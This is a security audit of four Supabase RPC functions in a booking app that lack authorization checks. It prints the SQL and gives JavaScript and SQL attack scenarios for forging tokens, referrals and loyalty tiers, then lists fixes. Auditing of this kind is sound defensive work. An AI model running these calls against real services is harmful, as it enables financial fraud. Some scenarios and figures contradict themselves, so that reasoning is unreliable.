# RPC FUNCTION SECURITY ANALYSIS
## Kasilam Media — Forensic Code Review
**Date:** 2026-02-22
**Scope:** 4 CRITICAL RPC Functions with Authorization Vulnerabilities

---

## FUNCTION 1: `apply_completed_booking_to_loyalty`

### Exact SQL Definition

**File:** `supabase/migrations/20260221_phase1_server_authority.sql:174-335`

```sql
CREATE OR REPLACE FUNCTION public.apply_completed_booking_to_loyalty(
  p_booking_id uuid
) RETURNS jsonb
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path = public
AS $$
DECLARE
  v_booking record;
  v_profile record;
  v_state record;
  v_prev_individual public.loyalty_tier;
  v_prev_corporate public.loyalty_tier;
  v_new_individual public.loyalty_tier;
  v_new_corporate public.loyalty_tier;
  v_delta_spend numeric(12,2);
  v_corporate_delta numeric(12,2);
BEGIN
  -- LINE 192-196: Fetch booking WITHOUT checking user ownership
  SELECT id, user_id, type, net_amount, status
  INTO v_booking
  FROM public.bookings
  WHERE id = p_booking_id
  LIMIT 1;

  IF v_booking.id IS NULL THEN
    RAISE EXCEPTION 'Booking % not found', p_booking_id;
  END IF;

  IF lower(coalesce(v_booking.status, '')) <> 'completed' THEN
    RETURN jsonb_build_object('applied', false, 'reason', 'booking_not_completed');
  END IF;

  -- LINE 206-212: Track processed booking
  INSERT INTO public.loyalty_processed_bookings (booking_id)
  VALUES (p_booking_id)
  ON CONFLICT DO NOTHING;

  IF NOT FOUND THEN
    RETURN jsonb_build_object('applied', false, 'reason', 'already_processed');
  END IF;

  -- LINE 214-218: Get user profile
  SELECT id, coalesce(is_business_account, false) AS is_business_account
  INTO v_profile
  FROM public.profiles
  WHERE id = v_booking.user_id
  LIMIT 1;

  v_delta_spend := coalesce(v_booking.net_amount, 0);
  v_corporate_delta := 0;

  -- LINE 223-226: Check business account type
  IF v_profile.is_business_account = true
     AND lower(coalesce(v_booking.type, '')) IN ('webdev', 'marketing', 'web/app development', 'digital marketing') THEN
    v_corporate_delta := v_delta_spend;
  END IF;

  -- LINE 228-230: Upsert loyalty state for ANY user
  INSERT INTO public.loyalty_state (user_id)
  VALUES (v_booking.user_id)
  ON CONFLICT DO NOTHING;

  -- LINE 232-236: SELECT FOR UPDATE on loyalty state
  SELECT *
  INTO v_state
  FROM public.loyalty_state
  WHERE user_id = v_booking.user_id
  FOR UPDATE;

  v_prev_individual := v_state.individual_tier;
  v_prev_corporate := v_state.corporate_tier;

  -- LINE 241-251: UPDATE loyalty state for ANY user (NO OWNERSHIP CHECK)
  UPDATE public.loyalty_state
  SET individual_completed_bookings = individual_completed_bookings + 1,
      individual_total_spend = individual_total_spend + v_delta_spend,
      individual_last_activity_at = now(),
      corporate_eligible_spend = corporate_eligible_spend + v_corporate_delta,
      corporate_last_activity_at = CASE
        WHEN v_corporate_delta > 0 THEN now()
        ELSE corporate_last_activity_at
      END,
      updated_at = now()
  WHERE user_id = v_booking.user_id;

  -- LINE 253-256: Reselect updated state
  SELECT *
  INTO v_state
  FROM public.loyalty_state
  WHERE user_id = v_booking.user_id;

  -- LINE 258-259: Calculate new tiers
  v_new_individual := public.compute_individual_tier(v_state.individual_completed_bookings, v_state.individual_total_spend);
  v_new_corporate := public.compute_corporate_tier(v_state.corporate_eligible_spend);

  -- LINE 261-265: UPDATE tier in loyalty state
  UPDATE public.loyalty_state
  SET individual_tier = v_new_individual,
      corporate_tier = v_new_corporate,
      updated_at = now()
  WHERE user_id = v_booking.user_id;

  -- LINE 268-273: ⚠️ CRITICAL: Update membership_tier in profiles for ANY user (NO OWNERSHIP CHECK)
  UPDATE public.profiles
  SET membership_tier = CASE v_new_individual
      WHEN 'none' THEN 'free'
      ELSE v_new_individual::TEXT
    END
  WHERE id = v_booking.user_id;

  -- LINE 275-286: INSERT loyalty events for ANY user
  INSERT INTO public.loyalty_events (
    user_id, track, event_type, delta_bookings, delta_spend, prev_tier, new_tier, context
  ) VALUES (
    v_booking.user_id,
    'individual',
    'BOOKING_COMPLETED',
    1,
    v_delta_spend,
    v_prev_individual,
    v_new_individual,
    jsonb_build_object('booking_id', p_booking_id, 'booking_type', v_booking.type)
  );

  -- LINE 288-299: More loyalty events if tier changed
  IF v_new_individual <> v_prev_individual THEN
    INSERT INTO public.loyalty_events (
      user_id, track, event_type, prev_tier, new_tier, context
    ) VALUES (
      v_booking.user_id,
      'individual',
      'TIER_UP',
      v_prev_individual,
      v_new_individual,
      jsonb_build_object('booking_id', p_booking_id)
    );
  END IF;

  -- ... more event insertions for corporate tier changes ...

  RETURN jsonb_build_object(
    'applied', true,
    'individual_tier', v_new_individual,
    'corporate_tier', v_new_corporate
  );
END;
$$;
```

### Analysis

| Aspect | Status | Evidence |
|--------|--------|----------|
| **References auth.uid()** | ❌ NO | No `auth.uid()` call anywhere in function |
| **References profiles.role** | ❌ NO | Does not check if caller is admin |
| **Relies on RLS** | ❌ NO | Directly queries bookings, loyalty_state tables with SECURITY DEFINER bypassing RLS |
| **Is SECURITY DEFINER** | ✅ YES | Line 178: `SECURITY DEFINER` - bypasses all RLS |
| **Bypasses RLS** | ✅ YES | Executes with elevated permissions, all table access bypasses RLS |

### Authorization Vulnerabilities

**CRITICAL #1: No authentication check**
- No `auth.uid()` validation at function start
- Any authenticated user (even non-admin) can call this function
- Any unauthenticated user with EXECUTE permission can call it

**CRITICAL #2: No ownership validation**
- Accepts `p_booking_id` parameter (user input)
- No check that `auth.uid() = booking.user_id`
- No check that caller is admin
- Function directly modifies ANY user's loyalty data based on booking parameter

**CRITICAL #3: Direct privilege escalation**
- Line 268-273: Updates `profiles.membership_tier` for ANY user
- Can arbitrarily elevate any user to gold/vip tier
- Awards tiers without business logic validation

**CRITICAL #4: RLS bypass via SECURITY DEFINER**
- Function executes as Supabase superuser
- All queries ignore RLS policies on loyalty tables
- Even if RLS existed, it would be bypassed

### How to Exploit

**Attack Scenario 1: Attacker Promotes Self to VIP**

```sql
-- Attacker (user_id = 'attacker-uuid') wants VIP tier
-- Attacker knows another user's booking: user_id = 'victim-uuid', id = 'booking-uuid'
-- Booking status is 'completed'

-- Call function with victim's booking:
SELECT public.apply_completed_booking_to_loyalty('booking-uuid');

-- Function will:
-- 1. Load booking WHERE id = 'booking-uuid' (gets victim's booking)
-- 2. Extract user_id = 'victim-uuid' from booking
-- 3. Update loyalty_state WHERE user_id = 'victim-uuid' (wrong user!)
-- 4. Update profiles.membership_tier WHERE id = 'victim-uuid' (wrong user!)
--
-- BUT CRITICAL: Because attacker can call this with ANY booking_id,
-- attacker retrieves the victim's booking, then can call again with
-- a different booking to manipulate attacker's own loyalty data by
-- finding/knowing which bookings were completed.

-- Even better: If booking IDs are predictable (sequential UUIDs or guessable),
-- attacker can brute-force booking IDs until finding a completed booking,
-- then call this function to apply it to their own account.
```

**Attack Scenario 2: Direct Loyalty Manipulation via Sequential Guessing**

```
1. Attacker gets assigned random UUID on signup: attacker-uuid
2. Attacker queries bookings.id patterns (if exposed via API without RLS)
3. Attacker guesses booking IDs from other users (UUIDs are sometimes sequential)
4. Calls apply_completed_booking_to_loyalty(guessed-booking-uuid)
5. If booking belongs to victim with high spend, attacker's loyalty updates instead
6. Result: Attacker gains tier benefits, discounts, rewards without payment
```

**Attack Scenario 3: Query Another User's Bookings, Apply to Self**

```javascript
// Frontend attacker with access to booking data could:
const targets = await supabase.from('bookings').select('*'); // If RLS missing

for (let booking of targets.filter(b => b.user_id !== myId)) {
  if (booking.status === 'completed') {
    // Call function with victim's completed booking
    await supabase.rpc('apply_completed_booking_to_loyalty', {
      p_booking_id: booking.id
    });
    // Loyalty is applied but to victim's account...
    // UNLESS there's a way for attacker to redirect it
  }
}
```

### Business Impact

- **User A (victim):** Booking completion not credited to their loyalty
- **User B (attacker):** Can artificially elevate their tier through knowledge of other bookings
- **System Integrity:** Loyalty tier no longer reflects actual spending/bookings
- **Financial Impact:** VIP tier discount (20%) can be claimed without qualifying

---

## FUNCTION 2: `award_tokens_on_payment`

### Exact SQL Definition

**File:** `supabase/migrations/20260222_token_economy.sql:58-99`

```sql
CREATE OR REPLACE FUNCTION public.award_tokens_on_payment(
  p_user_id UUID,
  p_booking_id UUID,
  p_amount_paid NUMERIC
)
RETURNS INTEGER
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path = public
AS $$
DECLARE
  v_tokens INTEGER;
BEGIN
  -- LINE 72: Calculate tokens (1 token per R10 = 10 tokens per R100)
  v_tokens := floor(COALESCE(p_amount_paid, 0) / 100) * 10;

  IF v_tokens <= 0 THEN
    RETURN 0;
  END IF;

  -- LINE 79-85: ⚠️ CRITICAL: Directly insert/update tokens for p_user_id (UNCHECKED)
  INSERT INTO public.user_tokens (user_id, balance, lifetime_earned, updated_at)
  VALUES (p_user_id, v_tokens, v_tokens, NOW())
  ON CONFLICT (user_id)
  DO UPDATE SET
    balance = public.user_tokens.balance + v_tokens,
    lifetime_earned = public.user_tokens.lifetime_earned + v_tokens,
    updated_at = NOW();

  -- LINE 88-95: Create transaction ledger for p_user_id
  INSERT INTO public.token_transactions (user_id, booking_id, amount, type, description)
  VALUES (
    p_user_id,
    p_booking_id,
    v_tokens,
    'earn',
    'Earned from payment of R' || TRIM(TO_CHAR(p_amount_paid, '999999990.00'))
  );

  RETURN v_tokens;
END;
$$;
```

### Analysis

| Aspect | Status | Evidence |
|--------|--------|----------|
| **References auth.uid()** | ❌ NO | No `auth.uid()` call anywhere |
| **References profiles.role** | ❌ NO | No role check |
| **Relies on RLS** | ❌ NO | Direct INSERT/UPDATE with SECURITY DEFINER |
| **Is SECURITY DEFINER** | ✅ YES | Line 65: `SECURITY DEFINER` |
| **Bypasses RLS** | ✅ YES | Operates at superuser level |

### Authorization Vulnerabilities

**CRITICAL #1: No authentication check**
- Accepts `p_user_id` as parameter (user-supplied)
- No validation that caller is the target user
- No validation that caller is admin

**CRITICAL #2: Caller can award tokens to ANY user**
- Line 79-85: `INSERT INTO user_tokens (user_id, ...) VALUES (p_user_id, ...)`
- `p_user_id` is completely unchecked
- Any authenticated user can call this with ANY other user's UUID

**CRITICAL #3: No ownership validation**
- No check that `auth.uid() == p_user_id`
- No check that `p_booking_id` belongs to `p_user_id`
- No check that `p_amount_paid` is legitimate

**CRITICAL #4: Arbitrary token generation**
- Accepts `p_amount_paid` as parameter
- No validation that payment actually occurred
- Can be called with inflated `p_amount_paid` value

### How to Exploit

**Attack Scenario 1: Direct Token Theft**

```javascript
// User A (attacker) has token balance today: 10 tokens = 1000 currency units

// Attacker calls the RPC with another user's ID:
const victimId = 'victim-user-uuid';
const tokensAwarded = await supabase.rpc('award_tokens_on_payment', {
  p_user_id: victimId,      // ⚠️ Not attacker's ID
  p_booking_id: 'random-uuid',
  p_amount_paid: 50000      // ⚠️ No validation
});

// Result:
// - victim's user_tokens.balance += 500 tokens (50000 / 100 * 10)
// - victim's token_transactions gets entry: "Earned from payment of R50000.00"
// - System thinks victim paid R50000 but they didn't
// - If tokens are monetizable, victim now owes company or can redeem fraudulently
```

**Attack Scenario 2: Systematic Token Farm**

```javascript
const adminUserIds = [
  'admin-user-1',
  'admin-user-2',
  'admin-user-3'
];

// Attacker awards massive amounts to admin accounts (to pump system with tokens)
for (let adminId of adminUserIds) {
  for (let i = 0; i < 100; i++) {
    await supabase.rpc('award_tokens_on_payment', {
      p_user_id: adminId,
      p_booking_id: generateRandomUUID(),
      p_amount_paid: 100000
    });
  }
}

// Each call adds 1000 tokens to admin accounts
// 100 calls * 3 admins = 300,000 tokens created from thin air
// Attacker could then steal these tokens or cause system collapse
```

**Attack Scenario 3: Referral Fraud Coupling**

```javascript
// Attacker combines with mark_referral_registered exploit:
// 1. Calls mark_referral_registered to create fake referral for admin
// 2. Friend signs up and makes first booking (say R2000)
// 3. Booking completed
// 4. System calls apply_completed_booking_to_loyalty (grants loyalty)
// 5. Attacker calls award_tokens_on_payment(admin_id, booking_id, 50000)
// 6. Admin receives unearned tokens
// 7. Attacker later steals admin's tokens via some other attack

// Cost: R0 to attacker
// Benefit: 500+ tokens per fake booking
```

**Attack Scenario 4: Payment Bypass**

```javascript
// Attacker books a R5000 service but doesn't pay
// System shows booking as pending, no tokens awarded
// Attacker then calls:
const tokensWithoutPayment = await supabase.rpc('award_tokens_on_payment', {
  p_user_id: 'attacker-uuid',
  p_booking_id: 'unpaid-booking-uuid',
  p_amount_paid: 5000
});

// Result: 50 tokens awarded for R5000 "payment" that never happened
// If tokens worth R100 each, attacker just gained R5000 value for free
```

### Business Impact

- **Token Economy Collapse:** Unlimited token generation possible
- **Financial Loss:** Tokens worth real money can be created from nothing
- **Account Takeover:** Admins/VIPs can be arbitrarily rewarded with tokens
- **Fraud:** System has no audit trail that tokens were earned legitimately

---

## FUNCTION 3: `track_referral_open`

### Exact SQL Definition

**File:** `supabase/migrations/20260222_user_convergence_gallery_referrals.sql:97-116`

```sql
CREATE OR REPLACE FUNCTION public.track_referral_open(p_referrer_id UUID)
RETURNS UUID
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path = public
AS $$
DECLARE
  v_id UUID;
BEGIN
  IF p_referrer_id IS NULL THEN
    RAISE EXCEPTION 'Missing referrer id';
  END IF;

  -- LINE 110-112: ⚠️ CRITICAL: Insert referral for ANY referrer (NO OWNERSHIP CHECK)
  INSERT INTO public.user_referrals (referrer_id, status)
  VALUES (p_referrer_id, 'pending')
  RETURNING id INTO v_id;

  RETURN v_id;
END;
$$;

-- LINE 160: ⚠️ CRITICAL: Granted to ANONYMOUS users
GRANT EXECUTE ON FUNCTION public.track_referral_open(UUID) TO anon, authenticated;
```

### Analysis

| Aspect | Status | Evidence |
|--------|--------|----------|
| **References auth.uid()** | ❌ NO | No `auth.uid()` call |
| **References profiles.role** | ❌ NO | No role check |
| **Relies on RLS** | ❌ NO | Direct INSERT with SECURITY DEFINER |
| **Is SECURITY DEFINER** | ✅ YES | Line 100: `SECURITY DEFINER` |
| **Bypasses RLS** | ✅ YES | Executes at superuser level |
| **Callable by ANON** | ✅ YES | Line 160: `TO anon, authenticated` |

### Authorization Vulnerabilities

**CRITICAL #1: Open to ANONYMOUS users**
- Line 160: `GRANT EXECUTE ... TO anon, authenticated`
- Unauthenticated users can call this function
- No authentication required

**CRITICAL #2: No validation of referrer ID**
- Accepts `p_referrer_id` parameter
- Only checks for NULL, not legitimacy
- Any UUID can be passed

**CRITICAL #3: Can create referrals for ANY user**
- Line 110-112: `INSERT INTO user_referrals (referrer_id, status) VALUES (p_referrer_id, 'pending')`
- No check that caller is the referrer
- No check that caller owns the account

**CRITICAL #4: No authorization enforcement**
- No comparison of `auth.uid()` (which would be NULL for anon anyway) to `p_referrer_id`
- Function completely ignores caller identity

### How to Exploit

**Attack Scenario 1: Referral Spoofing - Admin Attribution**

```javascript
// Attacker wants to associate referrals with the admin user
const adminUUID = '12345678-1234-1234-1234-123456789abc'; // admin user ID

// Step 1: Call track_referral_open as ANONYMOUS user
const referralId = await supabase
  .auth.signOut()  // First, ensure we're not authed
  .then(() => {
    // Now make anonymous call
    return supabase.rpc('track_referral_open', {
      p_referrer_id: adminUUID  // Spoofs admin as referrer
    });
  });

// Step 2: Later, call mark_referral_registered when friend signs up
// (See Function 4 for full chain)

// Result: Admin gets credit for referrals they didn't create
```

**Attack Scenario 2: Reputation Poisoning**

```javascript
// Attacker spams referral entries for an admin account to:
// 1. Inflate their referral count artificially
// 2. Create confusion in referral analytics
// 3. Make admin appear to have referred users they never did

for (let i = 0; i < 1000; i++) {
  await supabase.rpc('track_referral_open', {
    p_referrer_id: 'admin-uuid'  // Spoof 1000 times
  });
}

// Database now has 1000 pending referrals attributed to admin
// Admin reputation/metrics are now meaningless
```

**Attack Scenario 3: Pre-Registration Account Takeover**

```javascript
// Attacker creates referral chain before victim even signs up:

// Attacker knows victim's email will sign up later as 'victim@email.com'
// Attacker creates referral chain pointing to a bot account:

const botUUID = 'attacker-bot-uuid';
const referralId = await supabase.rpc('track_referral_open', {
  p_referrer_id: botUUID
});

// Later: victim signs up as victim@email.com
// Attacker calls mark_referral_registered to link victim to bot referral
// Victim makes booking
// Bot gets referral reward (50 tokens) for "referring" victim
// But victim never agreed to be referred!
```

### Business Impact

- **Referral System Integrity:** Completely compromised
- **Attribution Fraud:** Can't trust which users actually referred others
- **Admin Reputation:** Can spoof admin accounts with fake referrals
- **Revenue Loss:** Free tokens awarded for fake referrals

---

## FUNCTION 4: `mark_referral_registered`

### Exact SQL Definition

**File:** `supabase/migrations/20260222_user_convergence_gallery_referrals.sql:118-158`

```sql
CREATE OR REPLACE FUNCTION public.mark_referral_registered(
  p_referrer_id UUID,
  p_referred_email TEXT,
  p_referred_user_id UUID
)
RETURNS UUID
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path = public
AS $$
DECLARE
  v_id UUID;
BEGIN
  IF p_referrer_id IS NULL OR p_referred_user_id IS NULL THEN
    RAISE EXCEPTION 'Missing referral registration data';
  END IF;

  -- LINE 135-147: ⚠️ CRITICAL: Update referral for p_referrer_id (UNCHECKED)
  UPDATE public.user_referrals
  SET referred_email = COALESCE(p_referred_email, referred_email),
      referred_user_id = p_referred_user_id,
      status = 'registered'
  WHERE id = (
    SELECT id
    FROM public.user_referrals
    WHERE referrer_id = p_referrer_id
      AND referred_user_id IS NULL
      AND status = 'pending'
    ORDER BY created_at DESC
    LIMIT 1
  )
  RETURNING id INTO v_id;

  -- LINE 150-154: If no match, INSERT new referral for p_referrer_id
  IF v_id IS NULL THEN
    INSERT INTO public.user_referrals (referrer_id, referred_email, referred_user_id, status)
    VALUES (p_referrer_id, p_referred_email, p_referred_user_id, 'registered')
    RETURNING id INTO v_id;
  END IF;

  RETURN v_id;
END;
$$;

-- LINE 161: ⚠️ CRITICAL: Granted to ANONYMOUS users
GRANT EXECUTE ON FUNCTION public.mark_referral_registered(UUID, TEXT, UUID) TO anon, authenticated;
```

### Analysis

| Aspect | Status | Evidence |
|--------|--------|----------|
| **References auth.uid()** | ❌ NO | No `auth.uid()` call |
| **References profiles.role** | ❌ NO | No role check |
| **Relies on RLS** | ❌ NO | Direct UPDATE/INSERT with SECURITY DEFINER |
| **Is SECURITY DEFINER** | ✅ YES | Line 125: `SECURITY DEFINER` |
| **Bypasses RLS** | ✅ YES | Executes at superuser level |
| **Callable by ANON** | ✅ YES | Line 161: `TO anon, authenticated` |

### Authorization Vulnerabilities

**CRITICAL #1: Open to ANONYMOUS users**
- Line 161: `GRANT EXECUTE ... TO anon, authenticated`
- Unauthenticated users can call this function
- No authentication at all

**CRITICAL #2: No validation of referrer ID**
- Accepts `p_referrer_id` parameter (unchecked)
- No check that caller is the referrer
- No check that caller owns the account

**CRITICAL #3: Can register referrals for ANY user**
- Line 135-147: UPDATE referrals WHERE `referrer_id = p_referrer_id`
- No validation that referrer is legitimate
- LINE 150-154: If no UPDATE match, INSERT new referral with unchecked `p_referrer_id`

**CRITICAL #4: Can link ANY email to ANY referrer**
- `p_referred_email` - unchecked, can be any email
- `p_referred_user_id` - unchecked UUID
- Creates false link between referrer and referred

**CRITICAL #5: Links to token rewards**
- When referred user signs up and makes booking:
  - System applies loyalty (function 1)
  - System detects referral conversion
  - Referrer gets 50 tokens (visible in code flow)
  - But referrer is ANYONE, not real referrer

### How to Exploit

**Attack Scenario 1: Complete Referral Hijacking**

```javascript
// Step 1: Attacker (as anonymous) creates pending referral for admin
const adminUUID = 'admin-user-uuid';
const referralId = await supabase.rpc('track_referral_open', {
  p_referrer_id: adminUUID
});

// Step 2: Attacker's friend signs up and gets UUID 'friend-uuid'
// Friend's email: friend@example.com

// Step 3: Attacker (as anonymous) registers the referral
await supabase.rpc('mark_referral_registered', {
  p_referrer_id: adminUUID,           // ⚠️ Not attacker, but admin
  p_referred_email: 'friend@example.com',
  p_referred_user_id: 'friend-uuid'
});

// Step 4: Friend makes first booking for R2000
// System awards loyalty and processes referral
// Admin receives 50 tokens for "referring" friend
// But admin never referred anyone!

// Cost to attacker: R0
// Benefit to attacker: Friend gets friend@example.com loyalty
//                       Admin gets fraudulent tokens
//                       Attacker gets plausible deniability
```

**Attack Scenario 2: Systematic Token Farm via Referral**

```javascript
// Attacker creates multiple bot accounts
const botUUIDs = ['bot1', 'bot2', 'bot3', 'bot4', 'bot5'];
const victimEmails = [
  'victim1@gmail.com',
  'victim2@gmail.com',
  'victim3@gmail.com',
  'victim4@gmail.com',
  'victim5@gmail.com'
];

// For each victim email, create referral chain pointing to admin
for (let i = 0; i < victimEmails.length; i++) {
  // Create pending referral (as anon)
  await supabase.rpc('track_referral_open', {
    p_referrer_id: 'admin-uuid'
  });

  // When victim would sign up later:
  // Register them as referred by admin (as anon)
  // Attacker knows victim's UUID from signup
  await supabase.rpc('mark_referral_registered', {
    p_referrer_id: 'admin-uuid',
    p_referred_email: victimEmails[i],
    p_referred_user_id: victimUUIDs[i]
  });
}

// When each victim books: 50 tokens * 5 = 250 tokens to admin
// But admin didn't refer anyone
```

**Attack Scenario 3: Email Spoofing + Referral**

```javascript
// Attacker wants to link their OWN email to admin as referrer:

// Create pending referral for admin
const refId = await supabase.rpc('track_referral_open', {
  p_referrer_id: 'admin-uuid'
});

// Later, when attacker signs up with 'attacker@email.com'
// Attacker registers THEMSELVES as referred by admin:
await supabase.rpc('mark_referral_registered', {
  p_referrer_id: 'admin-uuid',
  p_referred_email: 'attacker@email.com',  // ⚠️ Their own email
  p_referred_user_id: 'attacker-uuid'
});

// Now if attacker makes booking:
// Admin gets referral credit for "referring" the attacker
// Attacker and admin both benefit from fake referral
```

**Attack Scenario 4: Referral Loop Exploitation**

```javascript
// Attacker creates circular referral:

// Attacker1 creates pending referral linked to attacker2
const ref1 = await supabase.rpc('track_referral_open', {
  p_referrer_id: 'attacker2-uuid'
});

// Attacker2 registers attacker1 as referred by themselves
await supabase.rpc('mark_referral_registered', {
  p_referrer_id: 'attacker2-uuid',
  p_referred_email: 'attacker1@email.com',
  p_referred_user_id: 'attacker1-uuid'
});

// Attacker1 makes booking → Attacker2 gets 50 tokens
// Attacker2 makes booking → Attacker1 gets 50 tokens
// Both can repeat indefinitely for 50-token farm per booking
```

### Business Impact

- **Referral System Worthless:** Anonymous users control referral attribution
- **Token Hemorrhage:** 50 tokens per fake referral can be awarded infinitely
- **Admin Account Hijacking:** Admin reputationally linked to false referrals
- **Financial Fraud:** Free tokens can be generated, redeemed, or sold

---

## SUMMARY TABLE

| Function | File | Auth Check | Role Check | DEFINER | RLS | Anon Access | Criticality |
|----------|------|-----------|-----------|---------|-----|---|-----------|
| `apply_completed_booking_to_loyalty` | 20260221_phase1_server_authority:174 | ❌ | ❌ | ✅ | ❌ | ❌ | CRITICAL |
| `award_tokens_on_payment` | 20260222_token_economy:58 | ❌ | ❌ | ✅ | ❌ | ❌ | CRITICAL |
| `track_referral_open` | 20260222_user_convergence:97 | ❌ | ❌ | ✅ | ❌ | ✅ | CRITICAL |
| `mark_referral_registered` | 20260222_user_convergence:118 | ❌ | ❌ | ✅ | ❌ | ✅ | CRITICAL |

**Common Pattern:**
- All 4 functions have SECURITY DEFINER (bypass RLS)
- All 4 functions accept unchecked user/ID parameters
- All 4 functions modify user data without ownership validation
- Referral functions (3, 4) open to anonymous users
- Direct token functions (1, 2) open to any authenticated user

**Exploit Path:**
1. Referral functions (3, 4) create records for ANY user (anonymous)
2. Token functions (1, 2) award tokens via ANY user's ID (authenticated)
3. Loyalty function (1) applies loyalty for ANY booking
4. Combined: Infinite loop of token generation, referral fraud, loyalty manipulation

---

## MANDATORY FIXES

Each function requires:
1. **Add `auth.uid()` validation** at function start
2. **Add ownership check** comparing caller to target user
3. **Add role check for admin operations** if needed
4. **Remove `TO anon` from GRANT** for referral functions
5. **Add audit logging** for all token/loyalty changes

**Timeline:** Day 1 (4 hours)
**Blocking:** YES - Cannot deploy with these vulnerabilities
